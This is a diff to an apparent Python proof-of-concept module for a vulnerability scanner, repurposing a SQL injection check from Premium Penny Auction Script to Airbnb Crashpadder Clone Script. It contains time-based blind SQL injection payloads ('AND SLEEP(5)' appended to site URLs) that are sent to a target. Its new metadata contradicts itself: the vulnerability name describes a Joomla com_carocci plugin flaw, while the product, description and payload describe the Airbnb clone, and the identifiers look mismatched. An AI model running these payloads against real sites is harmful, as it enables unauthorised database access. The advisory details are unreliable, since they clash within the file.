@@ -5,23 +5,23 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
 class Vuln(ABVuln):
-    vuln_id = 'CNVD-2017-05560' # 平台漏洞编号
-    name = 'Premium Penny Auction Script SQL注入' # 漏洞名称
+    vuln_id = 'Airbnb-Crashpadder-Clone-Script_0006' # 平台漏洞编号
+    name = 'Joomla com_carocci插件isbn参数SQL注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2017-04-29'  # 漏洞公布时间
+    disclosure_date = '2017-04-11'  # 漏洞公布时间
     desc = '''
-    Premium Penny Auction Script是一个拍卖网站搭建系统。
-    Premium Penny Auction Script中的allauctions.php中的aid参数、news.php中的nid参数以及productdetails.php中的aid参数都存在SQL注入漏洞，攻击者可利用该漏洞读取数据库中的敏感信息。
+    Airbnb Crashpadder Clone Script是一套可以部署类似Airbnb房屋共享租赁网站的系统。
+    Airbnb-Crashpadder-Clone-Script 存在SQL注入漏洞，攻击者可利用该漏洞读取数据库中的敏感信息。
     ''' # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-05560' #
-    cnvd_id = 'CNVD-2017-05560' # cnvd漏洞编号
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-05561' #
+    cnvd_id = 'CNVD-2017-05561' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Premium Penny Auction Script'  # 漏洞组件名称
-    product_version = 'Premium Penny Auction Script'  # 漏洞应用版本
+    product = 'Airbnb-Crashpadder-Clone-Script'  # 漏洞组件名称
+    product_version = 'Airbnb Crashpadder Clone Script'  # 漏洞应用版本
 
 class Poc(ABPoc):
-    poc_id = '3129e3f6-96e7-4b46-89ee-11d635d0ec12' # 平台 POC 编号
+    poc_id = '7d4532fe-2e75-401d-bbd2-62439a554e16' # 平台 POC 编号
     author = '国光'  # POC编写者s
     create_date = '2018-08-08' # POC创建时间
 
@@ -46,8 +46,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            payload1 = "/allauctions.php?aid=1"
-            payload2 = "/allauctions.php?aid=1 AND SLEEP(5)"
+            payload1 = "/view-rental/1/1"
+            payload2 = "/view-rental/1/1 AND SLEEP(5)"
             vul_url1 = arg + payload1
             vul_url2 = arg + payload2
 
